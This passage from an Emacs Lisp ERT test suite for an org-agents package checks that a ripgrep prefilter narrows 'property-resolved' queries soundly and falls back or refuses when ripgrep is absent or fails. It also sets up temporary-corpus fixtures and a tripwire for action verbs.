        ;; Both sides of the disjunction are exercised: the master by the
        ;; NAME arm, the follower by the PROTOTYPE arm.
        (should (member (file-truename (funcall F "proto-master.org")) cands))
        (should (member (file-truename (funcall F "proto-follower.org")) cands))
        ;; And it still narrows.
        (should-not (member (file-truename (funcall F "filler.org")) cands))
        (should-not (member (file-truename (funcall F "plan.org")) cands)))
      ;; The existence form too, and over the whole corpus.
      (let ((cands (org-agents-test--should-cover
                    '(property-resolved "STATUS") paths dir)))
        (should (member (file-truename (funcall F "proto-follower.org")) cands))
        (should-not (member (file-truename (funcall F "filler.org"))
                            cands))))))

(ert-deftest org-agents-test-rg-property-resolved-stays-residual-at-the-declared-default ()
  "At the declared default the conjunct pushes NOTHING, and it must not.
With `:ATTR_DEFAULT: active' declared, an entry that spells neither a
`:STATUS:' line nor a `:PROTOTYPE:' line resolves `STATUS' to `active'
anyway -- so no pattern over the file's text can narrow, and the conjunct
has to stay residual for org-ql.

Both halves, because the splitter's half alone would pass for a
prefilter that pushed the alternation and got lucky: the outcome half
names the file a pushed alternation demonstrably loses."
  (org-agents-test--with-rg-corpus
    (with-temp-file registry
      (insert org-agents-test--rg-registry-default-active))
    (org-agents--with-attributes
      ;; The splitter half.
      (should-not (org-agents--prefilter-conjuncts
                   '(property-resolved "STATUS" "active")))
      (should-not (org-agents--prefilter-conjuncts
                   '(and (todo) (property-resolved "STATUS" "active"))))
      ;; The outcome half: org-ql matches in a file holding neither line,
      ;; and the alternation the splitter declined to push does not return
      ;; it.
      (let ((live (org-agents-test--live-files
                   '(property-resolved "STATUS" "active") paths))
            (narrowed (org-agents-test--rg-truenames
                       '((property-resolved "STATUS" "active")) dir))
            (filler (file-truename (funcall F "filler.org"))))
        (should (member filler live))
        (should-not (member filler narrowed))))))

(ert-deftest org-agents-test-rg-property-resolved-bare-existence-with-a-default-is-residual ()
  "The exception is not for the value form only: bare existence needs it too.
A declared default makes EVERY entry in the corpus resolve the name, so
`(property-resolved NAME)' is true everywhere and nothing narrows."
  (org-agents-test--with-rg-corpus
    (with-temp-file registry
      (insert org-agents-test--rg-registry-default-active))
    (org-agents--with-attributes
      (should-not (org-agents--prefilter-conjuncts
                   '(property-resolved "STATUS")))
      (let ((live (org-agents-test--live-files '(property-resolved "STATUS")
                                               paths))
            (narrowed (org-agents-test--rg-truenames
                       '((property-resolved "STATUS")) dir))
            (filler (file-truename (funcall F "filler.org"))))
        (should (member filler live))
        (should-not (member filler narrowed))))))

(ert-deftest org-agents-test-rg-property-resolved-pushes-when-the-default-differs ()
  "A default that is not the tested value narrows as usual.
A NARROWING test and not a soundness one, and it needs to exist for
exactly that reason: no soundness assertion can fail for a prefilter that
pushes too little, so an exception widened from \"the default equals the
value\" to \"a default is declared\" would leave the whole suite green
while every `$NAME^' agent walked its scope's entire file set."
  (org-agents-test--with-rg-corpus
    (with-temp-file registry
      (insert "* STATUS\n:PROPERTIES:\n:ATTR_TYPE: string\n"
              ":ATTR_DEFAULT: blocked\n:END:\n\n"
              "* Prototypes\n** Task\n:PROPERTIES:\n:STATUS: active\n:END:\n"))
    (org-agents--with-attributes
      (should (equal (org-agents--prefilter-conjuncts
                      '(property-resolved "STATUS" "active"))
                     '((property-resolved "STATUS" "active"))))
      ;; And the narrowing is real: the whole corpus is 33 files and the
      ;; answer is not.
      (let ((cands (org-agents-test--should-cover
                    '(property-resolved "STATUS" "active") paths dir)))
        (should (member (file-truename (funcall F "proto-follower.org")) cands))
        (should-not (member (file-truename (funcall F "filler.org")) cands))
        (should (< (length cands) (length paths))))
      ;; The value the default DOES equal is the exception, in the same
      ;; registry -- so the rule is about the pair and not about the name.
      (should-not (org-agents--prefilter-conjuncts
                   '(property-resolved "STATUS" "blocked"))))))

(ert-deftest org-agents-test-rg-property-resolved-default-comparison-matches-the-predicate ()
  "The exception's comparison and the predicate's are ONE decision.
`:ATTR_DEFAULT: Active' against a query for `active': the splitter
pushes, because `equal' on the raw strings says they differ, and the
predicate does not match an entry that spells neither line, because
`string-equal' says the same thing.  Both halves in one test, so the two
comparisons cannot drift apart -- make either of them case-insensitive
and this fails."
  (org-agents-test--with-rg-corpus
    (with-temp-file registry
      (insert "* STATUS\n:PROPERTIES:\n:ATTR_TYPE: string\n"
              ":ATTR_DEFAULT: Active\n:END:\n\n"
              "* Prototypes\n** Task\n:PROPERTIES:\n:STATUS: active\n:END:\n"))
    (org-agents--with-attributes
      ;; The splitter pushes.
      (should (equal (org-agents--prefilter-conjuncts
                      '(property-resolved "STATUS" "active"))
                     '((property-resolved "STATUS" "active"))))
      ;; And the predicate does not match where nothing is spelled, so
      ;; pushing loses nothing.
      (let ((live (org-agents-test--live-files
                   '(property-resolved "STATUS" "active") paths)))
        (should-not (member (file-truename (funcall F "filler.org")) live))
        (should (member (file-truename (funcall F "proto-follower.org")) live)))
      ;; The whole superset relation, over the whole corpus.
      (org-agents-test--should-cover '(property-resolved "STATUS" "active")
                                    paths dir))))

(ert-deftest org-agents-test-rg-property-resolved-with-no-registry-pushes-the-alternation ()
  "No registry declares no default, so the alternation is sound and pushed.
The safe answer falls out by construction rather than by special case:
`org-agents--file-cache-key' answers nil for a file that cannot be read,
`org-agents-attribute' answers nil, and `(plist-get nil :default)' is nil.
An entry spelling neither line then resolves local nil, chain nil, default
nil -- so it cannot match, and nothing is lost by narrowing.

Silently, too: a missing registry is optional and says nothing about
itself."
  (org-agents-test--with-rg-corpus
    (should-not (file-exists-p registry))
    (org-agents--with-attributes
      (let ((texts (org-agents-test--messages
                     (should (equal (org-agents--prefilter-conjuncts
                                     '(property-resolved "STATUS" "active"))
                                    '((property-resolved "STATUS" "active"))))
                     (should (equal (org-agents--prefilter-conjuncts
                                     '(property-resolved "STATUS"))
                                    '((property-resolved "STATUS")))))))
        (should-not texts))
      ;; And with no registry the follower resolves nothing, so the answer
      ;; is the master's file alone -- narrowed, and still a superset.
      (let ((cands (org-agents-test--should-cover
                    '(property-resolved "STATUS" "active") paths dir)))
        (should (member (file-truename (funcall F "proto-master.org")) cands))
        (should-not (member (file-truename (funcall F "filler.org"))
                            cands))))))

(ert-deftest org-agents-test-rg-property-resolved-ignores-org-use-property-inheritance ()
  "A broad `org-use-property-inheritance' costs `property' its narrowing, not this.
`org-agents-resolve-property' never reads that option and never passes an
INHERIT argument, so it cannot change what `property-resolved' answers --
and refusing to push for a name in it would be a pure loss of narrowing,
invisible to every superset assertion in this file.  Hence a NARROWING
half, and an outcome half that loses no file."
  (org-agents-test--with-rg-corpus
    (with-temp-file registry
      (insert org-agents-test--rg-registry-no-default))
    (org-agents--with-attributes
      (let ((org-use-property-inheritance t))
        ;; Plain `property' pushes nothing, by its own conservative guard.
        (should-not (org-agents--prefilter-conjuncts '(property "STATUS")))
        ;; And `property-resolved' pushes the alternation anyway.
        (should (equal (org-agents--prefilter-conjuncts
                        '(property-resolved "STATUS" "active"))
                       '((property-resolved "STATUS" "active"))))
        ;; Losing nothing: the superset holds at this setting too.
        (let ((cands (org-agents-test--should-cover
                      '(property-resolved "STATUS" "active") paths dir)))
          (should (member (file-truename (funcall F "proto-follower.org"))
                          cands))))
      ;; The same at a list setting, which is the shape a real init uses.
      (let ((org-use-property-inheritance '("STATUS")))
        (should (equal (org-agents--prefilter-conjuncts
                        '(property-resolved "STATUS"))
                       '((property-resolved "STATUS"))))))))

(ert-deftest org-agents-test-rg-property-resolved-special-property-is-residual ()
  "A special property pushes NOTHING, and here that is soundness.
`org-entry-get' answers `CATEGORY' out of the entry's structure or its
file name, so no drawer line spells it.  For plain `property' pushing one
yields an empty candidate set -- visibly wrong.  Here it is worse: the
`:PROTOTYPE:' arm still matches some files, so the answer is non-empty and
WRONG, and every matching file with no `:PROTOTYPE:' line is dropped with
no error.  The outcome half names such a file."
  (org-agents-test--with-rg-corpus
    (with-temp-file registry
      (insert org-agents-test--rg-registry-no-default))
    (dolist (name '("CATEGORY" "TODO" "DEADLINE" "ITEM" "TAGS"))
      (should-not (org-agents--prefilter-conjuncts
                   (list 'property-resolved name)))
      (should-not (org-agents--prefilter-conjuncts
                   (list 'property-resolved name "x"))))
    ;; `filler.org' holds one entry whose CATEGORY is its file name, and
    ;; neither a `:CATEGORY:' line nor a `:PROTOTYPE:' line.
    (let ((live (org-agents-test--live-files
                 '(property-resolved "CATEGORY" "filler") paths))
          (narrowed (org-agents-test--rg-truenames
                     '((property-resolved "CATEGORY" "filler")) dir))
          (filler (file-truename (funcall F "filler.org"))))
      (should (member filler live))
      (should-not (member filler narrowed)))))

(ert-deftest org-agents-test-rg-property-resolved-agent-name-pushes-the-ordinary-pattern ()
  "An `AGENT_' name resolves LOCAL-ONLY, so the ordinary conjunct is right.
No chain and no default can answer for it, so a drawer line is exactly
its condition: the alternation would be over-wide rather than unsound,
and slower for no reason.  `PROTOTYPE' itself is the same case."
  (org-agents-test--with-rg-corpus
    (with-temp-file registry
      (insert "* AGENT_VIEW\n:PROPERTIES:\n:ATTR_TYPE: string\n"
              ":ATTR_DEFAULT: table\n:END:\n"))
    ;; The ordinary conjunct, even with a default declared for the name.
    (should (equal (org-agents--prefilter-conjuncts
                    '(property-resolved "AGENT_VIEW" "table"))
                   '((property "AGENT_VIEW" "table"))))
    (should (equal (org-agents--prefilter-conjuncts
                    '(property-resolved "AGENT_QUERY"))
                   '((property "AGENT_QUERY"))))
    (should (equal (org-agents--prefilter-conjuncts
                    '(property-resolved "PROTOTYPE"))
                   '((property "PROTOTYPE"))))
    ;; And therefore a pattern with no `:PROTOTYPE:' arm in it.
    (should (equal (org-agents--rg-patterns '(property "AGENT_VIEW" "table"))
                   '("^[ \\t]*:AGENT_VIEW\\+?:[ \\t]+table[ \\t]*$")))
    ;; A value spanning two lines downgrades to existence, as it does for
    ;; `property': the ordinary row's rule, applied by the same call.
    (should (equal (org-agents--prefilter-conjuncts
                    '(property-resolved "AGENT_VIEW" "two words"))
                   '((property "AGENT_VIEW"))))))

(ert-deftest org-agents-test-rg-property-resolved-reads-the-registry-once ()
  "A query with several widened conjuncts costs ONE registry key, in a batch.
The key is the expensive half -- a `file-truename' and a
`find-buffer-visiting' that walks the whole buffer list -- and the
splitter asks for a default once per conjunct."
  (let ((keys 0)
        (real (symbol-function 'org-agents--file-cache-key)))
    (cl-letf (((symbol-function 'org-agents--file-cache-key)
               (lambda (&rest args) (cl-incf keys) (apply real args))))
      (org-agents-test--with-rg-corpus-unguarded
        (with-temp-file registry
          (insert org-agents-test--rg-registry-no-default))
        (setq keys 0)
        (org-agents--with-attributes
          (should (org-agents--prefilter-conjuncts
                   '(and (property-resolved "STATUS" "active")
                         (property-resolved "OWNER")
                         (property-resolved "REVIEWS" "3")
                         (todo)))))
        (should (= 1 keys))))))

(ert-deftest org-agents-test-resolved-default-refuses-to-answer-outside-a-batch ()
  "Narrowing a resolved conjunct outside one registry snapshot SIGNALS.
`org-agents-test-collect-reads-one-registry-for-splitter-and-predicate'
pins the invariant for the one caller that exists; this pins it for the
one that does not exist yet.  The straddle is real and was MEASURED
before the guard: compute patterns against a registry declaring
`:ATTR_DEFAULT: dflt', rewrite the registry to declare `other', then run
org-ql -- the whole-corpus answer holds two entries that spell neither a
`:STATUS:' line nor a `:PROTOTYPE:' line, and the narrowed answer holds
neither of them.  Two matches lost, no error, no message.

The guard cannot be satisfied by remembering to wrap: it refuses, so a
later narrowing caller written outside `org-agents--in-attributes-batch'
fails on its first test run instead of shipping a silent under-match.
Both `property-resolved' rows of `org-agents--pushdown-fns' reach it, so
both are asserted -- and a name the rows reject before they ask for a
default is unaffected, which is why `CATEGORY' answers nil quietly."
  (org-agents-test--with-rg-corpus
    (with-temp-file registry
      (insert org-agents-test--rg-registry-default-active))
    ;; Outside a batch: both rows refuse.
    (should-error (org-agents--prefilter-conjuncts
                   '(property-resolved "STATUS" "active"))
                  :type 'error)
    (should-error (org-agents--prefilter-conjuncts
                   '(property-resolved "STATUS"))
                  :type 'error)
    ;; Nested under a combinator is the same conjunct, and refuses too.
    (should-error (org-agents--prefilter-conjuncts
                   '(and (todo) (property-resolved "STATUS" "active")))
                  :type 'error)
    ;; A name the row rejects never asks for a default, so it is quiet:
    ;; a special pushes nothing, and an `AGENT_' name is rewritten to the
    ;; ordinary pattern -- see
    ;; `org-agents-test-rg-property-resolved-agent-name-pushes-the-ordinary-pattern'.
    (should-not (org-agents--prefilter-conjuncts
                 '(property-resolved "CATEGORY" "x")))
    (should (equal (org-agents--prefilter-conjuncts
                    '(property-resolved "AGENT_QUERY"))
                   '((property "AGENT_QUERY"))))
    ;; And every shape that does not read the registry is unaffected.
    (should (org-agents--prefilter-conjuncts '(property "STATUS" "active")))
    (should (org-agents--prefilter-conjuncts '(heading "Review")))
    ;; Inside the batch the same forms answer.
    (org-agents--with-attributes
      (should-not (org-agents--prefilter-conjuncts
                   '(property-resolved "STATUS" "active")))
      (should (equal (org-agents--prefilter-conjuncts
                      '(property-resolved "OWNER" "alice"))
                     '((property-resolved "OWNER" "alice")))))))

(ert-deftest org-agents-test-collect-reads-one-registry-for-splitter-and-predicate ()
  "One `org-agents--collect' reads the registry once, for both of its readers.
Not a saving: the SPLITTER decides whether to narrow by reading
`:ATTR_DEFAULT:', and `property-resolved' decides whether an entry matches
by reading the same `:ATTR_DEFAULT:'.  Two separate reads could in
principle straddle an edit, and a narrowing decided against a default
that had gone away would lose files.  Inside one batch they are provably
the same read.

The count also catches the wrapping being dropped outright, since then
nothing warms the cache and each look-up keys the file for itself."
  (let ((keys 0)
        (real (symbol-function 'org-agents--file-cache-key)))
    (cl-letf (((symbol-function 'org-agents--file-cache-key)
               (lambda (&rest args) (cl-incf keys) (apply real args))))
      (org-agents-test--in-agent
        (let ((org-agents-attributes-file (expand-file-name "reg.org" dir)))
          (with-temp-file org-agents-attributes-file
            (insert "* STATUS\n:PROPERTIES:\n:ATTR_TYPE: string\n:END:\n"
                    "\n* Prototypes\n** Task\n:PROPERTIES:\n"
                    ":STATUS: active\n:END:\n"))
          (org-entry-put nil "AGENT_QUERY"
                         "(and (property-resolved \"STATUS\" \"active\") \
(property-resolved \"OWNER\"))")
          (let ((org-agents--attributes-cache nil)
                (org-agents--prototypes-cache nil)
                (agent (org-agents--read-agent)))
            (setq keys 0)
            (org-agents--collect agent)
            (should (= 1 keys))))))))

(ert-deftest org-agents-test-collect-says-a-dangling-prototype-once ()
  "One update says a dangling `:PROTOTYPE:' once, however many entries name it.
`org-agents--collect' binds `org-agents--prototype-warned' for the whole
extent of the update, so the diagnostic is a fact about the corpus said
once rather than a line per candidate entry."
  (org-agents-test--in-agent
    (let ((org-agents-attributes-file (expand-file-name "reg.org" dir)))
      (with-temp-file org-agents-attributes-file
        (insert "* STATUS\n:PROPERTIES:\n:ATTR_TYPE: string\n:END:\n"))
      (with-temp-buffer
        (dotimes (i 12)
          (insert (format "* TODO Follower %d\n:PROPERTIES:\n" i)
                  ":PROTOTYPE: Nosuchmaster\n:END:\n"))
        (append-to-file (point-min) (point-max) a))
      (org-entry-put nil "AGENT_QUERY" "(property-resolved \"STATUS\")")
      (let* ((org-agents--attributes-cache nil)
             (org-agents--prototypes-cache nil)
             (agent (org-agents--read-agent))
             (texts (org-agents-test--messages (org-agents--collect agent)))
             (about (cl-remove-if-not
                     (lambda (text) (string-match-p "Nosuchmaster" text))
                     texts)))
        (should (= 1 (length about)))))))

;;; When the prefilter is consulted, and what happens when it cannot answer

(ert-deftest org-agents-test-prefilter-not-consulted-for-named-files ()
  "A scope that NAMES its files is scanned live, with no subprocess.
MEASURED: an `agenda'-scope update over the eight largest files of the
author's corpus -- 8.9 MB, 373 matches -- costs 0.03 to 0.05 s once the
buffers are visited and spawns nothing, while a single rg run over that
corpus costs 0.10 to 0.45 s.  So prefiltering a scope that names its
files is pure overhead: several times the cost of the whole update, to
reach the same answer.
The spawn is made DETECTABLE rather than assumed away -- a `make-process'
that records the breach in a flag, because the backend catches errors by
design and would swallow a signalling stub.  The stub is on
`make-process' because that is what the bounded prefilter spawns with; it
was `call-process' while the run was synchronous."
  (org-agents-test--with-corpus
    (let ((breached nil)
          (query '(and (todo) (property "NEXT_REVIEW"))))
      ;; The query really does push, so the absence of a spawn is the
      ;; scope rule declining and not an empty conjunct list.
      (should (org-agents--prefilter-conjuncts query))
      (cl-letf (((symbol-function 'make-process)
                 (lambda (&rest _) (setq breached t) nil)))
        (let ((org-agenda-files (list a b)))
          (should (equal (list a b)
                         (org-agents--scope-files
                          (list :scope 'agenda :query query)))))
        (should (equal (list a b)
                       (org-agents--scope-files
                        (list :scope (list a b) :query query))))
        (should-not breached)))))

(ert-deftest org-agents-test-prefilter-consulted-for-a-corpus-scope ()
  "The other half of the rule: an unbounded scope IS narrowed.
Without this, the test above could be satisfied by never prefiltering at
all."
  (org-agents-test--with-rg-corpus
    (let* ((agent (list :scope 'active :query '(property "TOKENS")))
           (files (org-agents--scope-files agent)))
      (should (equal files (list (funcall F "prop-accum.org")))))))

(ert-deftest org-agents-test-prefilter-nil-never-spawns ()
  "Nil is an explicit request for live evaluation, and it is honoured.
No process for any scope, and a corpus scope resolves to its whole base
file set rather than to the old refusal, which would make the opt-out
unusable."
  (org-agents-test--with-rg-corpus-unguarded
    (let ((org-agents-prefilter nil)
          (breached nil))
      (cl-letf (((symbol-function 'make-process)
                 (lambda (&rest _) (setq breached t) nil)))
        (let* ((agent (list :scope 'all :query '(property "NEXT_REVIEW")))
               (files (org-agents--scope-files agent)))
          ;; The whole base set, not a narrowed one: `filler.org' holds
          ;; no `:NEXT_REVIEW:' line and is in the answer all the same.
          (should (member (funcall F "filler.org") files))
          (should (<= org-agents-test--rg-corpus-count
                      (length files)
                      (1+ org-agents-test--rg-corpus-count))))
        (should-not breached)))))

(ert-deftest org-agents-test-prefilter-auto-falls-back-with-one-message ()
  "Absent ripgrep, `auto' scans live and SAYS SO, once, naming the count.
On the author's corpus that walk is 3,634 files and a query that had not
finished after nine minutes -- a shocking thing to happen without
explanation, and a message naming the file count explains it.  Silence
is what this replaces; an error is what `require' is for."
  (org-agents-test--with-rg-corpus-unguarded
    (let ((org-agents-rg-executable "no-such-program-xyzzy")
          (agent (list :scope 'all :query '(property "NEXT_REVIEW"))))
      (let* (files
             (msgs (org-agents-test--messages
                    (setq files (org-agents--scope-files agent))))
             (ours (cl-remove-if-not
                    (lambda (m) (string-prefix-p "org-agents: " m)) msgs)))
        (should (member (funcall F "filler.org") files))
        (should (<= org-agents-test--rg-corpus-count (length files)
                    (1+ org-agents-test--rg-corpus-count)))
        (should (= 1 (length ours)))
        (should (string-match-p "not narrowed" (car ours)))
        (should (string-match-p "ripgrep not found" (car ours)))
        ;; The count is in the message, which is the whole point of it.
        (should (string-match-p
                 (format "scanning %d files live" (length files))
                 (car ours)))))
    ;; A query with nothing to push takes the same path, with its own
    ;; reason named.
    (let* ((agent (list :scope 'all :query '(todo)))
           files
           (msgs (org-agents-test--messages
                  (setq files (org-agents--scope-files agent)))))
      (should (member (funcall F "filler.org") files))
      (should (cl-find-if (lambda (m)
                            (string-match-p "no pushable conjunct" m))
                          msgs)))))

(ert-deftest org-agents-test-prefilter-auto-falls-back-when-rg-fails ()
  "Exit 2 is a failure, so `auto' abandons the prefilter for the whole agent.
Using the runs that succeeded would be sound -- an intersection missing a
term is wider -- but a partial answer from a broken tool is not a thing
to build on, and the fallback is correct and merely slower."
  (org-agents-test--with-rg-corpus-unguarded
    (let* ((fake (org-agents-test--fake-rg
                  (expand-file-name "fake-rg" outside)
                  "echo 'rg: broken' >&2" "exit 2"))
           (org-agents-rg-executable fake)
           (agent (list :scope 'all :query '(property "NEXT_REVIEW")))
           files
           (msgs (org-agents-test--messages
                  (setq files (org-agents--scope-files agent)))))
      (should (member (funcall F "filler.org") files))
      (should (<= org-agents-test--rg-corpus-count (length files)
                  (1+ org-agents-test--rg-corpus-count)))
      (should (cl-find-if (lambda (m) (string-match-p "ripgrep failed" m))
                          msgs)))))

(ert-deftest org-agents-test-prefilter-require-refuses-instead ()
  "`require' turns an unnarrowable unbounded scope into an error.
For someone who would rather be told that an agent cannot be answered
affordably than wait for a live walk of the whole corpus.
A `user-error' rather than a bare `error', because
`org-agents-update-buffer' catches the former per agent and one
misconfigured agent must not abort a whole buffer's run."
  (org-agents-test--with-rg-corpus-unguarded
    (let ((org-agents-prefilter 'require)
          (org-agents-rg-executable "no-such-program-xyzzy"))
      (cl-letf (((symbol-function 'org-agents--scope-base-files)
                 (lambda (&rest _) (error "must not walk the corpus"))))
        (let ((err (should-error
                    (org-agents--scope-files
                     (list :scope 'all :query '(property "NEXT_REVIEW")))
                    :type 'user-error)))
          (should (string-match-p "all" (error-message-string err)))
          (should (string-match-p "ripgrep not found"
                                  (error-message-string err))))
        ;; And for a query with nothing to push, naming that reason.
        (let ((err (should-error
                    (org-agents--scope-files
                     (list :scope 'all :query '(todo)))
                    :type 'user-error)))
          (should (string-match-p "no pushable conjunct"
                                  (error-message-string err))))))))

(ert-deftest org-agents-test-prefilter-require-proceeds-when-it-can-narrow ()
  "`require' refuses only what cannot be narrowed, and narrows the rest.
Every other `require' test arranges for the prefilter to be UNABLE to
answer, so both opposite ways of breaking the option survived: widening
the refusal guard to fire on a successful narrowing made the option
entirely non-functional, and returning the scope's base file set instead
of the narrowed one made it walk the whole corpus -- the one thing it
exists to forbid.  Both left the suite green.

The assertion is the same single-file answer
`org-agents-test-prefilter-consulted-for-a-corpus-scope' makes under
`auto': `require' must not change WHAT is resolved, only what happens
when it cannot be."
  (org-agents-test--with-rg-corpus
    (let* ((org-agents-prefilter 'require)
           (agent (list :scope 'active :query '(property "TOKENS")))
           (files (org-agents--scope-files agent)))
      (should (equal files (list (funcall F "prop-accum.org")))))))

(ert-deftest org-agents-test-prefilter-empty-answer-renders-zero-matches ()
  "An empty answer completes the update and renders nothing.
No error, and no message reporting a missing prefilter: this is the
defect the backend swap fixes, and it deserves its own named test."
  (org-agents-test--with-rg-corpus
    (let* ((agent-file (expand-file-name "agent.org" dir))
           text)
      (with-temp-file agent-file
        (insert "* Review agent\n:PROPERTIES:\n"
                ":AGENT_QUERY: (property \"NOSUCHPROPERTY\")\n"
                ":AGENT_SCOPE: all\n:END:\n"))
      (with-current-buffer (find-file-noselect agent-file)
        (goto-char (point-min))
        (let ((msgs (org-agents-test--messages (org-agents-update))))
          (should-not (cl-find-if (lambda (m) (string-match-p "prefilter" m))
                                  msgs))
          (should-not (cl-find-if (lambda (m) (string-match-p "not narrowed" m))
                                  msgs)))
        (setq text (buffer-string)))
      (should (string-match-p ":AGENT_MATCHED: 0 \\[" text)))))

(ert-deftest org-agents-test-mode-save-spawns-no-prefilter ()
  "A save spawns no subprocess, and the manual command still does.
The scope rule already prevents it for every scope a save updates -- an
`agenda' agent names its files -- but the binding is kept as a belt, so
that \"a save spawns no ripgrep\" is a property of this function rather
than a consequence of a rule stated elsewhere.

Note the REASON: the prefilter is a local subprocess that cannot pay for
itself over a named file list -- 0.10 to 0.45 s of ripgrep against an
update measured at 0.03 to 0.05 s -- so the rule is about pointless work
on a keystroke, not about a save that might hang."
  (org-agents-test--with-corpus
    (let* ((sentinel (expand-file-name "rg-was-called" dir))
           (fake (org-agents-test--fake-rg
                  (expand-file-name "fake-rg" dir)
                  (concat "touch " (shell-quote-argument sentinel))
                  "exit 1"))
           (org-agents-rg-executable fake)
           (org-agents-prefilter 'auto)
           (query "(and (todo) (property \"NEXT_REVIEW\"))")
           (org-agenda-files (list a b)))
      ;; The harness works: reaching the backend really does spawn it.
      (should (listp (org-agents--rg-run "PAT" dir)))
      (should (file-exists-p sentinel))
      (delete-file sentinel)
      (with-temp-file agent-file
        (insert "* Review agent\n:PROPERTIES:\n"
                ":AGENT_QUERY: " query "\n"
                ":AGENT_SCOPE: agenda\n:END:\n"))
      (with-current-buffer (find-file-noselect agent-file)
        (org-agents-mode 1)
        (set-buffer-modified-p t)
        (save-buffer)
        ;; The update really ran, so the sentinel's absence is the save
        ;; path declining and not the save path doing nothing.
        (should (string-match-p "Fix widget"
                                (org-agents-test--file-text agent-file)))
        (should-not (file-exists-p sentinel))
        ;; The same agent under a corpus scope, updated by hand, DOES
        ;; reach the backend: binding the prefilter away inside
        ;; `org-agents--scope-files' rather than on the save path would
        ;; take it from the manual commands too.
        (goto-char (point-min))
        (org-entry-put nil "AGENT_SCOPE" "all")
        (org-agents-update-buffer)
        (should (file-exists-p sentinel))))))

;;;; Actions

;; This is the one section whose subject is WRITING to the corpus, so
;; every fixture here builds its own temporary directory and every
;; assertion is made against a file inside it.  Nothing here may name a
;; path under the developer's own `org-directory': an action pointed at
;; the real corpus would edit the user's data, and a test is exactly
;; where that would happen by accident.
;;
;; The GUARANTEES come first, and deliberately so.  An action that ran on
;; save, that arrived through a prototype, that evaluated its own
;; argument, or that answered its own confirmation would be a hole no
;; feature test would notice -- so the four tests that say none of those
;; happens are written before the vocabulary they guard, and each names
;; the mutation it exists to fail.

(defconst org-agents-test--action-verbs
  '(org-agents-action/set-property!
    org-agents-action/delete-property!
    org-agents-action/tag!
    org-agents-action/todo!
    org-agents-action/priority!
    org-agents-action/scheduled!
    org-agents-action/deadline!
    org-agents-action/effort!
    org-agents-action/archive!)
  "The shipped vocabulary, written out here on purpose.
This test owns the list.  A verb added to the package and not to it fails
`org-agents-test-action-vocabulary-is-complete', which is what keeps a
tenth verb from arriving without the destructive declaration and the
tripwire coverage the other nine have.")

(defvar org-agents-test--verb-calls 0
  "How many times `org-agents-test--with-verb-tripwire' caught a verb.")

(defmacro org-agents-test--with-verb-tripwire (&rest body)
  "Run BODY with every action verb replaced by a counting tripwire.
`org-agents-test--verb-calls' counts the calls, and the tripwire signals
as well, so a path that reaches a verb cannot go on to do anything with
what it got back.  `org-agents--action-call' is replaced too: it is the
one call site, so a caller that reached the machinery without naming a
verb is caught as well.

Not `cl-letf': the places are a computed list rather than literals, and
where a verb does not exist yet -- which is the state every one of these
tests was first run in -- this still puts the world back.

The tripwire takes `(PHASE &rest _)' and not `(&rest _)', and the
signature is load-bearing: `org-agents--parse-actions' checks a verb's
arity with `func-arity', so a `(&rest _)' stand-in reports a minimum of
zero, is refused as \"not a usable verb\", and the parse fails before
any verb could be reached -- which would make this macro assert nothing
at all while looking as though it had."
  (declare (indent 0))
  `(let ((org-agents-test--verb-calls 0)
         (saved (mapcar (lambda (s) (cons s (and (fboundp s)
                                                 (symbol-function s))))
                        (cons 'org-agents--action-call
                              org-agents-test--action-verbs))))
     (unwind-protect
         (progn
           (dolist (cell saved)
             (fset (car cell)
                   (lambda (_phase &rest _)
                     (setq org-agents-test--verb-calls
                           (1+ org-agents-test--verb-calls))
                     (error "org-agents-test: an action verb was reached"))))
           ,@body)
       (dolist (cell saved)
         (if (cdr cell)
             (fset (car cell) (cdr cell))
           (fmakunbound (car cell)))))))

(defmacro org-agents-test--with-action-corpus (action &rest body)
  "Run BODY over a temporary corpus whose agents carry ACTION.
ACTION is the `:AGENT_ACTION:' text, or nil for agents that carry none.

`dir' is the corpus root and `org-directory' is it, so no test here can
reach the developer's own; `a' and `b' name the two corpus files and
`agent-file' the file holding the agents; `org-agenda-files' is the
corpus.  Buffers visiting the corpus are killed afterwards, because the
files they visit are about to be deleted.

TWO agents are written -- a `children' one and a `list' one with a
dynamic block -- because the entry-point enumeration has to exercise the
block writer as well as the two render paths, and both must be shown to
reach no verb.

The window configuration is put back for the reason
`org-agents-test--with-corpus' gives: `org-update-dblock' indents in the
selected window's buffer, which in batch is `*scratch*'."
  (declare (indent 1))
  `(save-window-excursion
     (let* ((dir (make-temp-file "org-agents-action" t))
            (a (expand-file-name "a.org" dir))
            (b (expand-file-name "b.org" dir))
            (agent-file (expand-file-name "agents.org" dir))
            (org-directory dir)
            (org-agents-prefilter nil)
            (org-use-property-inheritance nil)
            (org-element-use-cache nil)
            (org-id-track-globally nil)
            (org-id-locations (make-hash-table :test #'equal))
            (org-id-files nil)
            (org-agenda-files (list a b))
            (action ,action))
       (ignore action)
       (unwind-protect
           (progn
             (with-temp-file a
               (insert "* TODO Fix widget :api:\n"
                       ":PROPERTIES:\n:NEXT_REVIEW: [2020-01-01 Wed]\n:END:\n"
                       "* TODO Fix gadget :api:stale:\n"
                       ":PROPERTIES:\n:NEXT_REVIEW: [2020-01-02 Thu]\n:END:\n"))
             (with-temp-file b (insert "* TODO Nothing to review here\n"))
             (with-temp-file agent-file
               (insert "* Review agent\n:PROPERTIES:\n"
                       ":AGENT_QUERY: (and (todo) (property \"NEXT_REVIEW\"))\n"
                       ":AGENT_SCOPE: (\"" a "\" \"" b "\")\n"
                       (if action (concat ":AGENT_ACTION: " action "\n") "")
                       ":END:\n"
                       "* Review list\n:PROPERTIES:\n"
                       ":AGENT_QUERY: (and (todo) (property \"NEXT_REVIEW\"))\n"
                       ":AGENT_SCOPE: (\"" a "\" \"" b "\")\n"
                       ":AGENT_VIEW: list\n"
                       (if action (concat ":AGENT_ACTION: " action "\n") "")
                       ":END:\n"
                       "#+BEGIN: org-agents\n#+END:\n"))
             ,@body)
         (dolist (buf (buffer-list))
           (when-let* ((f (buffer-file-name buf)))
             (when (string-prefix-p (file-name-as-directory dir) f)
               (with-current-buffer buf (set-buffer-modified-p nil))
               (kill-buffer buf))))
         (delete-directory dir t)))))

(defmacro org-agents-test--at-agent (action &rest body)
  "Run BODY at the `children' agent of `org-agents-test--with-action-corpus'."
  (declare (indent 1))
  `(org-agents-test--with-action-corpus ,action
     (with-current-buffer (find-file-noselect agent-file)
       (goto-char (point-min))
       ,@body)))

(defun org-agents-test--action-property (file heading property)
  "PROPERTY at the entry of FILE whose heading text holds HEADING."
  (with-current-buffer (find-file-noselect file)
    (org-with-wide-buffer
     (goto-char (point-min))
     (should (re-search-forward (concat "^\\*+.*" (regexp-quote heading))
